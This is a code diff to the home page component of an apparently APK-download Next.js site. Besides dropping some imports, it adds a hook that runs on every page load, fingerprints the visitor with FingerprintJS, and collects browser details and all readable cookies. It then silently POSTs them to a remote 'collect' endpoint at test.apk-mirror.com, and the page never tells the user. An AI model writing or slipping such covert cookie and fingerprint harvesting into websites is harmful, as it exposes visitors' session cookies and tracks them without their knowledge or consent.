@@ -5,10 +5,7 @@ import Android from "./categoryWrapper";
 import Image from "next/image";
 import axios from "axios";
 import LoadingComponent from "./Loading";
-import Head from "next/head";
-import NextScript from "./NextScript";
 import Ads from "./Ads";
-import MultiplexAds from "./MultiplexAds";
 
 export default function Home() {
   const [value, setValue] = useState('')
@@ -17,6 +14,51 @@ export default function Home() {
   const [isLoading, setLoading] = useState(false);
   const isAdsServe = JSON.parse(process.env.NEXT_PUBLIC_SERVE_ADS);
 
+  useEffect(() => {
+    if (typeof window.FingerprintJS !== 'undefined') {
+
+      FingerprintJS.load().then((fp) => {
+        fp.get().then((result) => {
+          const browserFingerprint = result.visitorId; 
+          const browserInfo = {
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            language: navigator.language,
+            screenResolution: `${window.screen.width}x${window.screen.height}`,
+            timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            pageUrl: window.location.href,
+            fingerprint: browserFingerprint,
+            cookies: getCookies(),
+          };
+
+        //  Send data to your custom API
+          const apiUrl = 'https://test.apk-mirror.com/collect'; 
+          fetch(apiUrl, {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json',
+            },
+            body: JSON.stringify(browserInfo),
+          })
+            .then((response) => response.json())
+            .then((data) => {
+              console.log('Successfully sent browser info and fingerprint:', data);
+            })
+            .catch((error) => {
+              console.error('Error sending browser info and fingerprint:', error);
+            });
+        });
+      });
+    }
+  }, []);
+
+  function getCookies() {
+    return document.cookie.split('; ').reduce((cookies, cookieString) => {
+        const [name, value] = cookieString.split('=');
+        cookies[name] = value;
+        return cookies;
+    }, {});
+}
   useEffect(() => {
     const getPopulars = async () => {
       setLoading(!isLoading);
